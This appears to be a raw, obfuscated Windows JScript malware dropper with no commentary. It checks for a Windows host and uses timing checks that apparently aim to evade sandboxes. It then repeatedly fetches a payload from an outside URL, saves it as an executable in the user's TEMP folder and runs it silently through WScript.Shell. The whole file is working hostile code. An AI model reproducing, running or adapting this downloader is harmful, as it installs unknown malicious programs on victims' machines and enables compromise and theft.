var DQ = false;
var q = "CreateObject";
var S = function O() {return WScript[q]("WScript.Shell");}(), Uu = 11;
var MJ = "MSXML2.XMLHTTP";
var Lp = 2123213;
var t0 = 0;
function K(i){S["Run"](i, t0, t0);};
function ok(){return "" + MJ;};
function m(n0, co){t0 = t0 * 1; return n0 - co;};
function V(){return q;};
/*@cc_on
  @if (@_win32 || @_win64)
    DQ = true;
  @end
@*/
if (DQ)
{
var e = "";
function jv(){return 22;};
var wX = 0; var P = 0;
function eQ()
{
var bC = new this["Date"]();
var rL = bC["getUTCMilliseconds"]();
WScript["Sleep"](jv());
var bC = new this["Date"]();
var W = bC["getUTCMilliseconds"]();
WScript["Sleep"](jv());
var bC = new this["Date"]();
var e0 = bC["getUTCMilliseconds"]();
var wX = "H";
wX = m(W, rL);
var P = "H0";
P = m(e0, W);
e = "open";
return m(wX, P);
}
var Q = false;
var oq = false;
for (var OQ = t0; OQ < jv() * 1; OQ++){if (eQ() != t0){
Q = true; 
P = "31" + 11 * wX + P; 
oq = true; 
break;
}}
function t() {return ((Q == true) && (Q == oq)) ? 1 : t0;};
if (Q && t() && oq){
function n() {return S["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "qKrWCnxQyI.exe";};
 k0 = ok();
 td = WScript[q](k0);
 var K0 = 1;
 while (K0){
try {
td[e]("GET", "http://caferacerpneus.com.br/lw2osd", false);
td["send"]();
Yu = "Sleep";
for (;;){WScript[Yu](jv() * 11); if (td["readystate"] >= 2 * 2) break;};
K0 = t0;
} catch(X){};
}
function Yb(k) {var em = (1, 2, 3, 4, 5, k); return em;};
lR = WScript[V()]("ADODB.Stream");
k0 = lR;
k0[e]();
k0["type"] = Yb(1);
k0["write"](td["ResponseBody"]);
lR["position"] = Yb(t0);
k0["Save" + "ToFile"](n(), 2);
lR["c"+"lose"]();
Y = n();
K(Y);
}
}

